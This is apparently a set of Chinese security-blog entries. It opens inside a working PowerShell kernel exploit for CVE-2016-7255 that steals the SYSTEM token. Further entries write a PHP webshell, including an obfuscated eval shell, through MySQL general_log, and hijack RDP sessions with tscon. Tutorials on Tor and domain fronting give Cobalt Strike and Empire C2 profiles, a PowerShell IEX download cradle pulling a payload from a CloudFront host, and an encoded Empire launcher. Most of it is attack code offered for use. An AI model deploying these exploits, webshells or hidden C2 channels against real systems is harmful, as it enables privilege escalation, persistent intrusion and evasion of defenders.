&#123; [System.Runtime.InteropServices.Marshal]::ReadInt64($Pointer) &#125; $CallResult = [BitmapElevate]::VirtualFree($Pointer, [System.IntPtr]::Size, 0x8000) &#125; # Arbitrary Kernel write function Bitmap-Write &#123; param ($Address, $Value) $CallResult = [BitmapElevate]::SetBitmapBits($ManagerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Address)) $CallResult = [BitmapElevate]::SetBitmapBits($WorkerBitmap, [System.IntPtr]::Size, [System.BitConverter]::GetBytes($Value)) &#125; switch ($OSMajorMinor) &#123; '10.0' # Win10 / 2k16 &#123; $UniqueProcessIdOffset = 0x2e8 $TokenOffset = 0x358 $ActiveProcessLinks = 0x2f0 &#125; '6.3' # Win8.1 / 2k12R2 &#123; $UniqueProcessIdOffset = 0x2e0 $TokenOffset = 0x348 $ActiveProcessLinks = 0x2e8 &#125; '6.2' # Win8 / 2k12 &#123; $UniqueProcessIdOffset = 0x2e0 $TokenOffset = 0x348 $ActiveProcessLinks = 0x2e8 &#125; '6.1' # Win7 / 2k8R2 &#123; $UniqueProcessIdOffset = 0x180 $TokenOffset = 0x208 $ActiveProcessLinks = 0x188 &#125; &#125; # Get EPROCESS entry for System process echo "`n[&gt;] Leaking SYSTEM _EPROCESS.." $SystemModuleArray = Get-LoadedModules $KernelBase = $SystemModuleArray[0].ImageBase $KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1] $KernelHanle = [BitmapElevate]::LoadLibrary("$KernelType") $PsInitialSystemProcess = [BitmapElevate]::GetProcAddress($KernelHanle, "PsInitialSystemProcess") $SysEprocessPtr = if (!$x32Architecture) &#123;$PsInitialSystemProcess.ToInt64() - $KernelHanle + $KernelBase&#125; else &#123;$PsInitialSystemProcess.ToInt32() - $KernelHanle + $KernelBase&#125; $CallResult = [BitmapElevate]::FreeLibrary($KernelHanle) echo "[+] _EPROCESS list entry: 0x$("&#123;0:X&#125;" -f $SysEprocessPtr)" $SysEPROCESS = Bitmap-Read -Address $SysEprocessPtr echo "[+] SYSTEM _EPROCESS address: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $SysEprocessPtr))" echo "[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))" echo "[+] SYSTEM Token: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $($SysEPROCESS+$TokenOffset)))" $SysToken = Bitmap-Read -Address $($SysEPROCESS+$TokenOffset) # Get EPROCESS entry for current process echo "`n[&gt;] Leaking current _EPROCESS.." echo "[+] Traversing ActiveProcessLinks list" $NextProcess = $(Bitmap-Read -Address $($SysEPROCESS+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size while($true) &#123; $NextPID = Bitmap-Read -Address $($NextProcess+$UniqueProcessIdOffset) if ($NextPID -eq $PID) &#123; echo "[+] PowerShell _EPROCESS address: 0x$("&#123;0:X&#125;" -f $NextProcess)" echo "[+] PID: $NextPID" echo "[+] PowerShell Token: 0x$("&#123;0:X&#125;" -f $(Bitmap-Read -Address $($NextProcess+$TokenOffset)))" $PoShTokenAddr = $NextProcess+$TokenOffset break &#125; $NextProcess = $(Bitmap-Read -Address $($NextProcess+$ActiveProcessLinks)) - $UniqueProcessIdOffset - [System.IntPtr]::Size &#125; # Duplicate token! echo "`n[!] Duplicating SYSTEM token!`n" Bitmap-Write -Address $PoShTokenAddr -Value $SysToken&#125;#==============================================================[Keyboard Functions]# See: https://msdn.microsoft.com/en-us/library/ms927178.aspxfunction Sim-KeyDown &#123; param([Int]$wKey) $KeyboardInput = New-Object KEYBDINPUT $KeyboardInput.dwFlags = 0 $KeyboardInput.wVk = $wKey $InputObject = New-Object INPUT $InputObject.itype = 1 $InputObject.U = $KeyboardInput $InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject) $CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize) if ($CallResult -eq 1) &#123; $true &#125; else &#123; $false &#125;&#125;function Sim-KeyUp &#123; param([Int]$wKey) $KeyboardInput = New-Object KEYBDINPUT $KeyboardInput.dwFlags = 2 $KeyboardInput.wVk = $wKey $InputObject = New-Object INPUT $InputObject.itype = 1 $InputObject.U = $KeyboardInput $InputSize = [System.Runtime.InteropServices.Marshal]::SizeOf($InputObject) $CallResult = [ms16135]::SendInput(1, $InputObject, $InputSize) if ($CallResult -eq 1) &#123; $true &#125; else &#123; $false &#125;&#125;function Do-AltShiftEsc &#123; $CallResult = Sim-KeyDown -wKey 0x12 # VK_MENU $CallResult = Sim-KeyDown -wKey 0x10 # VK_SHIFT $CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyDown -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x1b # VK_ESCAPE $CallResult = Sim-KeyUp -wKey 0x12 # VK_MENU $CallResult = Sim-KeyUp -wKey 0x10 # VK_SHIFT&#125;function Do-AltShiftTab &#123; param([Int]$Count) $CallResult = Sim-KeyDown -wKey 0x12 # VK_MENU $CallResult = Sim-KeyDown -wKey 0x10 # VK_SHIFT for ($i=0;$i -lt $count;$i++) &#123; $CallResult = Sim-KeyDown -wKey 0x9 # VK_TAB $CallResult = Sim-KeyUp -wKey 0x9 # VK_TAB &#125; $CallResult = Sim-KeyUp -wKey 0x12 # VK_MENU $CallResult = Sim-KeyUp -wKey 0x10 # VK_SHIFT&#125;#==============================================================[Create-Bitmaps]do &#123; $Bitmap1 = Stage-gSharedInfoBitmap $Bitmap2 = Stage-gSharedInfoBitmap if ($Bitmap1.BitmapKernelObj -lt $Bitmap2.BitmapKernelObj) &#123; $WorkerBitmap = $Bitmap1 $ManagerBitmap = $Bitmap2 &#125; else &#123; $WorkerBitmap = $Bitmap2 $ManagerBitmap = $Bitmap1 &#125; $Distance = $ManagerBitmap.BitmapKernelObj - $WorkerBitmap.BitmapKernelObj&#125; while ($Distance -ne 0x2000)echo "[?] Adjacent large session pool feng shui.."echo "[+] Worker : $('&#123;0:X&#125;' -f $WorkerBitmap.BitmapKernelObj)"echo "[+] Manager : $('&#123;0:X&#125;' -f $ManagerBitmap.BitmapKernelObj)"echo "[+] Distance: 0x$('&#123;0:X&#125;' -f $Distance)"# Address of the y-coordinate for the bitmap$TargetAddress = $WorkerBitmap.BitmapKernelObj + 63#==============================================================[Trigger Function]function Do-OrAddress &#123; param([Int64]$Address) # Create WNDCLASSEX atom $AtomCreate = New-Object ms16135 $hAtom = $AtomCreate.CustomClass("cve-2016-7255") if ($hAtom -eq 0)&#123; break &#125; echo "`n[?] Creating Window objects" $hMod = [ms16135]::GetModuleHandleW([String]::Empty) # WS_OVERLAPPEDWINDOW|WS_VISIBLE $hWndParent = [ms16135]::CreateWindowExW(0,"cve-2016-7255",[String]::Empty,0x10CF0000,0,0,360,360,[IntPtr]::Zero,[IntPtr]::Zero,$hMod,[IntPtr]::Zero) if ($hWndParent -eq 0)&#123; break &#125; # WS_OVERLAPPEDWINDOW|WS_VISIBLE|WS_CHILD $hWndChild = [ms16135]::CreateWindowExW(0,"cve-2016-7255","cve-2016-7255",0x50CF0000,0,0,160,160,$hWndParent,[IntPtr]::Zero,$hMod,[IntPtr]::Zero) if ($hWndChild -eq 0)&#123; break &#125; # Align target $Address = $Address - 0x28 echo "[+] Corrupting child window spmenu" # manipulate child spmenu $CallResult = [ms16135]::SetWindowLongPtr($hWndChild,-12,[IntPtr]$Address) # Window magic $CallResult = [ms16135]::ShowWindow($hWndParent,1) $hDesktopWindow = [ms16135]::GetDesktopWindow() $CallResult = [ms16135]::SetParent($hWndChild,$hDesktopWindow) $CallResult = [ms16135]::SetForegroundWindow($hWndChild) Do-AltShiftTab -Count 4 $CallResult = [ms16135]::SwitchToThisWindow($hWndChild,$true) Do-AltShiftEsc # This is a bit messy, but the bug is not easy to trigger # while also reliably exiting the loop. Basically we try to # trigger the arbitrary "Or" for 3 seconds and then check if # it was successful. If not we try up to ten times (should # take 2-4 attempts). function Trigger-Write &#123; $SafeGuard = [diagnostics.stopwatch]::StartNew() while ($SafeGuard.ElapsedMilliseconds -lt 3000) &#123; $tagMSG = New-Object tagMSG if ($([ms16135]::GetMessage([ref]$tagMSG,[IntPtr]::Zero,0,0))) &#123; $CallResult = [ms16135]::SetFocus($hWndParent) # for ($i=0;$i-lt20;$i++)&#123;Do-AltShiftEsc&#125; # $CallResult = [ms16135]::SetFocus($hWndChild) # Bug triggers here! for ($i=0;$i-lt20;$i++)&#123;Do-AltShiftEsc&#125; # $CallResult = [ms16135]::TranslateMessage([ref]$tagMSG) $CallResult = [ms16135]::DispatchMessage([ref]$tagMSG) &#125; &#125; $SafeGuard.Stop() &#125; [IntPtr]$Global:BytePointer = [ms16135]::VirtualAlloc([System.IntPtr]::Zero, 0x2000, 0x3000, 0x40) do &#123; echo "[+] Trying to trigger arbitrary 'Or'.." $ByteRead = [ms16135]::GetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer) Trigger-Write $LoopCount += 1 &#125; while ($ByteRead -ne 0x2000 -And $LoopCount -lt 10) # Clean up $CallResult = [ms16135]::DestroyWindow($hWndChild) $CallResult = [ms16135]::DestroyWindow($hWndParent) $CallResult = [ms16135]::UnregisterClass("cve-2016-7255",[IntPtr]::Zero) # Because shit happens, or patched if ($LoopCount -eq 10) &#123; echo "`n[!] Bug did not trigger, try again or patched?`n" $Script:BugNotTriggered = 1 &#125;&#125;Do-OrAddress -Address $TargetAddressif ($BugNotTriggered) &#123; Return&#125;#==============================================================[Set pvScan0 Manger]# Calculate offsetif ($OSMajorMinor -eq "6.1") &#123; $SizeVal = 0x400000770&#125; else &#123; $SizeVal = 0x400000760&#125;do &#123; $Read64 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount) if ($Read64 -eq $SizeVal) &#123; $Pointer1 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 16) $Pointer2 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $LoopCount + 24) if ($Pointer1 -eq $Pointer2) &#123; $BufferOffset = $LoopCount + 16 Break &#125; &#125; $LoopCount += 8&#125; while ($LoopCount -lt 0x2000)$pvBits = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset)$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)# Sanity check, probably unnecessaryif ($pvScan0 -ne 0) &#123; echo "`n[?] Success, reading beyond worker bitmap size!" echo "[+] Old manager bitmap pvScan0: $('&#123;0:X&#125;' -f $pvScan0)"&#125; else &#123; echo "`n[!] Buffer contains invalid data, quitting..`n" Return&#125;# Overwrite pointers in buffer[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset),$WorkerBitmap.BitmappvScan0)[System.Runtime.InteropServices.Marshal]::WriteInt64($($BytePointer.ToInt64() + $BufferOffset + 8),$WorkerBitmap.BitmappvScan0)$pvScan0 = [System.Runtime.InteropServices.Marshal]::ReadInt64($BytePointer.ToInt64() + $BufferOffset + 8)echo "[+] New manager bitmap pvScan0: $('&#123;0:X&#125;' -f $pvScan0)"# Overwrite adjacent kernel _SURFOBJ$CallResult = [ms16135]::SetBitmapBits($WorkerBitmap.BitmapHandle,0x2000,$BytePointer)#==============================================================[Elevate]Bitmap-Elevate -ManagerBitmap $ManagerBitmap.BitmapHandle -WorkerBitmap $WorkerBitmap.BitmapHandleif([String]::IsNullOrEmpty($Application))&#123;Write-Host "[!] Nothing to do.." &#125;else&#123;cmd /c $Application + " " + $Commandline&#125;&#125; github地址：戳我demo:]]></content>
      <categories>
        <category>工具收集</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL语句利用日志写shell]]></title>
    <url>%2Farchives%2Ftest1.html</url>
    <content type="text"><![CDATA[outfile被禁止，或者写入文件被拦截； 在数据库中操作如下：（必须是root权限） 1234567show variables like '%general%'; #查看配置set global general_log = on; #开启general log模式set global general_log_file = '/var/www/html/1.php'; #设置日志目录为shell地址select '&lt;?php eval($_POST[cmd]);?&gt;' #写入shell SQL查询免杀shell的语句1SELECT "&lt;?php $p = array('f'=&gt;'a','pffff'=&gt;'s','e'=&gt;'fffff','lfaaaa'=&gt;'r','nnnnn'=&gt;'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?&gt;" 原文：戳我]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[windows切换其他登陆用户]]></title>
    <url>%2Farchives%2Fchange_user.html</url>
    <content type="text"><![CDATA[查看用户:123456C:\Windows\system32&gt;query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME administrator 1 Disc 1 3/12/2017 3:07 PM&gt;localadmin rdp-tcp#55 2 Active . 3/12/2017 3:10 PMC:\Windows\system32&gt; 创建服务：12C:\Windows\system32&gt;sc create sesshijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#55"[SC] CreateService SUCCESS 启动服务：1net setart sesshijack 细节：http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[URL 采集(Google)]]></title>
    <url>%2Farchives%2FURL.html</url>
    <content type="text"><![CDATA[google:12345var h3 = document.getElementsByTagName('h3');for(var i=0;i&lt;h3.length;i++)&#123; var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);&#125; bing:12345var h3 = document.getElementsByTagName('h2');for(var i=0;i&lt;h3.length;i++)&#123; var a = h3[i]. getElementsByTagName('a'); console.log(a[0].href);&#125;]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[隐匿的攻击之-Tor Fronting]]></title>
    <url>%2Farchives%2FTor_Fronting.html</url>
    <content type="text"><![CDATA[文章第一时间发布在www.4hou.com。文章已授权嘶吼独家发布，未经许可禁止转载，如若转载请联系嘶吼编辑 0x01 简介学习完Domain Fronting之后，又从@vysecurity的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。 0x02 Tor Hidden ServicesTor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。 怎样搭建Tor Hidden Services可以参考此wiki，下面介绍一下我测试环境的搭建过程。环境为：Ubuntu 12.04搭建过程如下：查看系统信息:1lsb_release -a 可以看到Codename为precise，所以在这里选择deb类型如下： 之后按照官方wiki修改更新源，我的源路径为/etc/apt/sources.list，有的系统更新源路径可能在/etc/apt/sources.list.d/，在源中添加以下条目：12deb http://deb.torproject.org/torproject.org precise maindeb-src http://deb.torproject.org/torproject.org precise main 之后执行以下命令:12gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add - 安装：12$ sudo apt-get update$ sudo apt-get install tor deb.torproject.org-keyring 执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。 之后要对tor进行一下配置，编辑配置文件/etc/tor/torrc，将以下两个参数前的注释去掉。12HiddenServiceDir /var/lib/tor/hidden_service/HiddenServicePort 80 127.0.0.1:8080 HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。 配置完成以后对Tor服务进行重启：1sudo service tor restart 查看获取到的hostname:1sudo cat /var/lib/tor/hidden_service/hostname 其中xxxxx.onion则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。开启8080端口的服务：123☁ ~ cd /tmp☁ ~ python -m SimpleHTTPServer 8080Serving HTTP on 0.0.0.0 port 8080 ... 使用tor浏览器访问此域名，可看到8080端口的响应： 0x03 Tor2Web要对这个隐藏server进行利用，需要借助于一个代理，即tor2web，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如http://duskgytldkxiuqc6.onion/的链接时，直接修改.onion成.onion.to或.onion.city 或 onion.cab 或者任何一个提供此服务的域名即可。如下图： 当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图： 那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：1curl -b 'onion_cab_iKnowShit=yourcookie' 'https://xxxx.onion.cab/1.txt' 0x04 Cobalt Strike同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下：tor-fronting.profile123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# make our C2 look like a Google Web Bug# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting## Author: @armitagehacker# Modified by Vincent Yiu @vysecurity for TOR.set sleeptime "5000";http-get &#123; set uri "/___utm"; client &#123; header "Host" "bjaw6h36vwruhwvb.onion.cab"; header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"; metadata &#123; base64url; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "plain/text"; output &#123; # hexdump pixel.gif # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00 # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00 # 0000020 01 00 01 00 00 02 01 44 00 3b prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;http-post &#123; set uri "/__utm"; set verb "GET"; client &#123; header "Host" "bjaw6h36vwruhwvb.onion.cab"; header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d"; id &#123; prepend "UA-220"; append "-2"; parameter "utmac"; &#125; output &#123; base64url; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "plain/text"; output &#123; prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;# dress up the staging process toohttp-stager &#123; server &#123; header "Content-Type" "plain/text"; &#125;&#125; 在这里需要注意的是，我们需要修改Get以及Post中的Host及Cookie为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。 开启teamserver：1☁ cobal sudo ./teamserver [your ip] hacktest tor-fronting.profile 连接到Teamserver，之后创建监听： 因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口一定要改成443。 使用onion.cab: 生成HTTPS Beacon： 生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。选择Edit：修改参数如下：保存之后，运行HTTPS beacon，成功上线： DEMO: https://www.youtube.com/watch?v=I3ovfrqcF0I 0x05 小结使用Tor Fronting 有以下几个特点：1、你不需要外网环境，将C2放到Docker或者本地都可以！（但是需要服务器在墙外）2、使C2匿名；3、并不需要在目标机上安装Tor；4、默认是安全的。5、要求C2上同时安装Cobalt Strike及Tor服务。通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。 0x06 参考1、https://www.torproject.org/docs/tor-hidden-service.html.en2、https://www.mdsec.co.uk/2017/02/tor-fronting-utilising-hidden-services-for-privacy/3、https://secureallthethings.blogspot.co.uk/2016/11/use-tor-use-empire.html4、https://www.tor2web.org/]]></content>
      <categories>
        <category>奇技淫巧</category>
      </categories>
      <tags>
        <tag>tor fronting</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[隐匿的攻击之-Domain Fronting]]></title>
    <url>%2Farchives%2FDomain_Fronting.html</url>
    <content type="text"><![CDATA[0x01 简介最近看到了一些关于Domain Fronting的技术，感觉很有意思，其特点在于，你真正访问的域名并不是你看到的域名，即可以隐藏攻击者的真实地址，并且此技术能够让我们在一些受限制的网络中依然连接到我们的C2服务器，其关键思想是在不同的通信层使用不同的域名，在HTTP(S)请求中，目标域名通常显示在三个关键位置：DNS查询，TLS（SNI）拓展及HTTP主机头中，通常，这三个地方都会是我们要访问的域名地址，然而，在”Domain Fronting”请求中，DNS查询以及SNI携带了一个域名（前域），而在HTTP host头中携带了另一个域名（隐蔽的，被禁止访问的域名），简单的图例如下: 通常检查器不能阻止DNS及SNI中请求的内容，而HOST头对检查器不可见，但对接收HTTP(S)请求的前端服务器可见，而前端服务器，在内部请求HTTP头中的Host的地址，进而达到隐蔽目的地的目的。关于Domain Fronting 这里有一篇文章有详细的介绍《Blocking-resistant communication through domain fronting》。本文就不在详细介绍了。感觉这个技术很有趣，所以就对此技术进行了一下研究与学习，并写此文进行分享。 0x02 情形渗透测试过程中，我们会遇到这种情形，即网络中部署了很多防御方案，比如防火墙开启IDP，IPS，IDS等，这些方案可用于限制网络出站规则，例如，仅仅允许TCP 80及443通过代理离开网络，并且还会有许多设备在应用层来检查这个流量，如果检测到恶意的Payload，则进行拦截并报警。绕过这些解决方案一直是入侵者与防御者之间的博弈，防御者努力的想怎么拦，而入侵者在努力的想怎么绕。因此也有了很多很多的攻击技术，比如DNS隧道，ICMP隧道等等。最近有一篇文章《Doodles, stickers, and censorship circumvention for Signal Android》介绍了通过Domain Fronting来绕过信号限制的方式，在此文中指出“许多流行的服务和CDN（如Google，Amazon Cloudfront，Amazon S3，Azure，CloudFlare，Fastly和Akamai）可以以一种方式获取信号，这种方式看起来与其他未经审查的流量不可辨别。因此，我们也可以通过此技术来绕过一些过滤规则。 0x03 示例这里我们使用Amazon’s CloudFront作为一个演示，CloudFront是一种内容交付网络服务。它为用户提供了一个全局分布式缓存，用于托管在其服务器上的文件。这减少了客户服务器上的负载，并允许CDN提供来自与请求者数据中心的缓存内容，当客户端连接到CloudFront的时候，其根据HOST头来判断客户端想要请求的域名，首先在Amazon’s CloudFront注册账号，之后按以下步骤建立自己的CloudFront：一、选择服务，CloudFront 二、新建节点 三、配置节点 填入自己的域名，并把Origin Protocol Policy配置为Match Viewer 修改箭头几处值 其他默认，点击创建。成功如下图： evi1cg.me为指向测试C2服务器的域名，下面使用wget来进行测试。12wget -U demo -q -O - https://evi1cg.github.io/foo.txthello there ! d289wv3b5uz3me.cloudfront.net为我的CloudFront，对这个域名的访问可访问到evi1cg.me的IP。12wget -U demo -q -O - http://d289wv3b5uz3me.cloudfront.net/foo.txthello there ! 如下图： 现在我们来伪造主机头来试试看。这里使用a0.awsstatic.com，此域名来自于这里。直接访问不会范围任何东西：1wget -U demo -q -O - http://a0.awsstatic.com/foo.txt 修改Host头，伪造Host为我们创建的CloudFront所分发的FQDN，这样就返回了我们要访问的文件：1wget -U demo -q -O - http://a0.awsstatic.com/foo.txt --header "Host: d289wv3b5uz3me.cloudfront.net" 如下图： 这样我们就可以使用高信誉域名来代替我们自己的域名了。 那么如何寻找类似于a0.awsstatic.com这样的高信誉域名呢，这里可以使用这个简单的命令来寻找：1for i in &#123;a..z&#125;; do for j in &#123;0..9&#125;; do wget -U demo -q -O - http://$i$j.awsstatic.com/foo.txt --header "Host: d289wv3b5uz3me.cloudfront.net" &amp;&amp; echo $i$j; done;done 如下图： 当然这里还可以写一个脚本来从热门网站列表中寻找可以使用的CDN子域，关于这个可以参考这个文章Domain Fronting Via Cloudfront Alternate Domains。 下面分享几个可用的域名： cdn.az.gov，cdn.zendesk.com，cdn.atlassian.com，a1.awsstatic.com，f0.awsstatic.com 0x04 应用1.Cobalt Strike大家都知道，Cobalt Strike可以通过Malleable C2 profile来修改becon的传输方式，那么在这里，我们也可以通过这个来进行重定向。所以要修改的就是在文件中修改header的Host指向我们的节点。比如：123http-get &#123; client &#123; header "Host" "[your distribution].cloudfront.net"; 123http-post &#123; client &#123; header "Host" "[your distribution].cloudfront.net"; 这里要注意的是http-get与http-post都要修改。一个修改好的webbug.profile如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# make our C2 look like a Google Web Bug# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting## Author: @armitagehackerhttp-get &#123; set uri "/__utm.gif"; client &#123; parameter "utmac" "UA-2202604-2"; parameter "utmcn" "1"; parameter "utmcs" "ISO-8859-1"; parameter "utmsr" "1280x1024"; parameter "utmsc" "32-bit"; parameter "utmul" "en-US"; header "Host" "d289wv3b5uz3me.cloudfront.net"; metadata &#123; netbios; prepend "__utma"; parameter "utmcc"; &#125; &#125; server &#123; header "Content-Type" "image/gif"; output &#123; # hexdump pixel.gif # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00 # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00 # 0000020 01 00 01 00 00 02 01 44 00 3b prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;http-post &#123; set uri "/___utm.gif"; client &#123; header "Content-Type" "application/octet-stream"; id &#123; prepend "UA-220"; append "-2"; parameter "utmac"; &#125; parameter "utmcn" "1"; parameter "utmcs" "ISO-8859-1"; parameter "utmsr" "1280x1024"; parameter "utmsc" "32-bit"; parameter "utmul" "en-US"; header "Host" "d289wv3b5uz3me.cloudfront.net"; output &#123; print; &#125; &#125; server &#123; header "Content-Type" "image/gif"; output &#123; prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b"; prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00"; prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00"; print; &#125; &#125;&#125;# dress up the staging process toohttp-stager &#123; server &#123; header "Content-Type" "image/gif"; &#125;&#125; 使用c2lint 来测试：1./c2lint Malleable-C2-Profiles/normal/webbug.profile 可以看到host已经改成了我们的节点地址。之后启动teamserver:1☁ cobal sudo ./teamserver [your ip] hacktest webbug.profile 之后连接到teamserver。创建监听： 注意host填的地址。并且要注意端口一定要是80。之后再填入我们找的那些高信誉域名地址，比如cdn.az.gov,当然可以填入多个，以,隔开即可： 使用web Delivery进行测试： 生成Posershell命令如下：1powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://d289wv3b5uz3me.cloudfront.net:80/a'))" 客户端运行以后成功上线： 使用wireshark查看流量： 可以看到流量里面并没有我们的真实域名而只有我们的节点地址，而解析的DNS地址是高信誉域名的地址。 如果想使用HTTPS，可以参考使用HTTPS beacon，及这个视频。本文就不做介绍了。 2.Empire使用Empire2.0(之所以使用2.0，是因为2.0可以自定义http头信息，只需要使用”|” 隔开即可)，需要对Listener进行重新配置。具体设置如下：1234567(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt;(Empire: listeners/http) &gt; set Host http://cdn.az.gov:80(Empire: listeners/http) &gt; set DefaultProfile /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (WindowsNT 6.1; WOW64; Trident/7.0;rv:11.0) like Gecko | Host:d289wv3b5uz3me.cloudfront.net(Empire: listeners/http) &gt; execute[*] Starting listener 'http'[+] Listener successfully started! 特别注意DefaultProfile后面添加了Host，并且使用端口为80！ 配置后结果如下： 之后开启监听，并配置stager1234(Empire: listeners) &gt; usestager multi/launcher(Empire: stager/multi/launcher) &gt; set Listener http(Empire: stager/multi/launcher) &gt; generatepowershell.exe -NoP -sta -NonI -W Hidden -Enc WwBSAEUAZgBdAC4AQQBTAFMARQBNAGIAbABZAC4ARwBlAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAVABGAGkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUARQAoACQATgBVAGwATAAsACQAVAByAFUARQApAH0AOwBbAFMAeQBTAHQAZQBtAC4ATgBFAHQALgBTAGUAUgB2AGkAYwBlAFAATwBpAE4AVABNAGEAbgBhAEcAZQByAF0AOgA6AEUAWABwAGUAQwB0ADEAMAAwAEMAbwBOAHQASQBOAFUAZQA9ADAAOwAkAHcAQwA9AE4ARQBXAC0ATwBCAEoARQBDAHQAIABTAHkAUwBUAEUATQAuAE4AZQBUAC4AVwBFAEIAQwBMAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwBOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwByAHYAOgAxADEALgAwACkA